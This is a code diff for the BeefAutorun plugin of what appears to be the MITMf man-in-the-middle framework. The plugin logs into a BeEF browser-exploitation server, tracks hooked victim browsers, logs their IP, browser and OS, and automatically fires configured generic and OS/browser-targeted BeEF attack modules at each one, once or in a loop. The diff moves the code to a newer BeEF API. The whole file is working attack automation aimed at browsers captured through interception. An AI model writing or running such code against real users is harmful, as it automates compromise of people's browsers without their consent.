@@ -21,6 +21,7 @@
 import logging
 import sys
 import json
+import threading
 
 from time import sleep
 from core.beefapi import BeefAPI
@@ -44,9 +45,6 @@ class BeefAutorun(Inject, Plugin):
 		Inject.initialize(self, options)
 
 		self.tree_info.append("Mode: {}".format(self.config['BeEFAutorun']['mode']))
-		self.onConfigChange()
-
-	def onConfigChange(self):
 
 		beefconfig = self.config['MITMf']['BeEF']
 
@@ -54,10 +52,13 @@ class BeefAutorun(Inject, Plugin):
 
 		self.beef = BeefAPI({"host": beefconfig['beefip'], "port": beefconfig['beefport']})
 		if not self.beef.login(beefconfig['user'], beefconfig['pass']):
-			shutdown("[-] Error logging in to BeEF!")
+			shutdown("[BeEFAutorun] Error logging in to BeEF!")
 
-	def startThread(self, options):
+	def startThread(self):
 		self.autorun()
+
+	def onConfigChange(self):
+		self.initialize(self.options)
 
 	def autorun(self):
 		already_ran    = []
@@ -65,62 +66,57 @@ class BeefAutorun(Inject, Plugin):
 
 		while True:
 			mode = self.config['BeEFAutorun']['mode']
-			sessions = self.beef.sessions_online()
-			if (sessions is not None and len(sessions) > 0):
-				for session in sessions:
 
-					if session not in already_hooked:
-						info = self.beef.hook_info(session)
-						mitmf_logger.info("{} >> joined the horde! [id:{}, type:{}-{}, os:{}]".format(info['ip'], info['id'], info['name'], info['version'], info['os']))
-						already_hooked.append(session)
-						self.black_ips.append(str(info['ip']))
+			for hook in self.beef.hooked_browsers.online:
 
-					if mode == 'oneshot':
-						if session not in already_ran:
-							self.execModules(session)
-							already_ran.append(session)
+				if hook.session not in already_hooked:
+					mitmf_logger.info("{} [BeEFAutorun] Joined the horde! [id:{}, type:{}-{}, os:{}]".format(hook.ip, hook.id, hook.name, hook.version, hook.os))
+					already_hooked.append(hook.session)
+					self.black_ips.append(hook.ip)
 
-					elif mode == 'loop':
-						self.execModules(session)
-						sleep(10)
+				if mode == 'oneshot':
+					if hook.session not in already_ran:
+						self.execModules(hook)
+						already_ran.append(hook.session)
 
-			else:
-				sleep(1)
+				elif mode == 'loop':
+					self.execModules(hook)
+					sleep(10)
 
-	def execModules(self, session):
-		session_info     = self.beef.hook_info(session)
-		session_ip       = session_info['ip']
-		hook_browser     = session_info['name']
-		hook_os          = session_info['os']
+			sleep(1)
+
+	def execModules(self, hook):
 		all_modules      = self.config['BeEFAutorun']["ALL"]
 		targeted_modules = self.config['BeEFAutorun']["targets"]
 
-		if len(all_modules) > 0:
-			mitmf_logger.info("{} >> sending generic modules".format(session_ip))
+		if all_modules:
+			mitmf_logger.info("{} [BeEFAutorun] Sending generic modules".format(hook.ip))
+			
 			for module, options in all_modules.iteritems():
-				mod_id = self.beef.module_id(module)
-				resp = self.beef.module_run(session, mod_id, json.loads(options))
-				if resp["success"] == 'true':
-					mitmf_logger.info('{} >> sent module {}'.format(session_ip, mod_id))
-				else:
-					mitmf_logger.info('{} >> ERROR sending module {}'.format(session_ip, mod_id))
+
+				for m in self.beef.modules.findbyname(module):
+					resp = m.run(hook.session, json.loads(options))
+
+					if resp["success"] == 'true':
+						mitmf_logger.info('{} [BeEFAutorun] Sent module {}'.format(hook.ip, m.id))
+					else:
+						mitmf_logger.info('{} [BeEFAutorun] Error sending module {}'.format(hook.ip, m.id))
+					
 				sleep(0.5)
 
-		for os in targeted_modules:
-			if (hook_browser is not None) and (hook_os is not None):
-				mitmf_logger.info("{} >> sending targeted modules".format(session_ip))
-				if (os in hook_os) or (os == hook_os):
-					browsers = targeted_modules[os]
-					if len(browsers) > 0:
-						for browser in browsers:
-							if browser == hook_browser:
-								modules = targeted_modules[os][browser]
-								if len(modules) > 0:
-									for module, options in modules.iteritems():
-										mod_id = self.beef.module_id(module)
-										resp = self.beef.module_run(session, mod_id, json.loads(options))
-										if resp["success"] == 'true':
-											mitmf_logger.info('{} >> sent module {}'.format(session_ip, mod_id))
-										else:
-											mitmf_logger.info('{} >> ERROR sending module {}'.format(session_ip, mod_id))
-										sleep(0.5)
+		if (hook.name and hook.os):
+			for os in targeted_modules:
+				if (os == hook.os) or (os in hook.os):
+					mitmf_logger.info("{} [BeEFAutorun] Sending targeted modules".format(hook.ip))
+
+					for browser in targeted_modules[os]:
+						if browser == hook.name:
+							for module, options in targeted_modules[os][browser].iteritems():
+								for m in self.beef.modules.findbyname(module):
+									resp = m.run(hook.session, json.loads(options))
+									if resp["success"] == 'true':
+										mitmf_logger.info('{} [BeEFAutorun] Sent module {}'.format(hook.ip, m.id))
+									else:
+										mitmf_logger.info('{} [BeEFAutorun] Error sending module {}'.format(hook.ip, m.id))
+								
+								sleep(0.5)
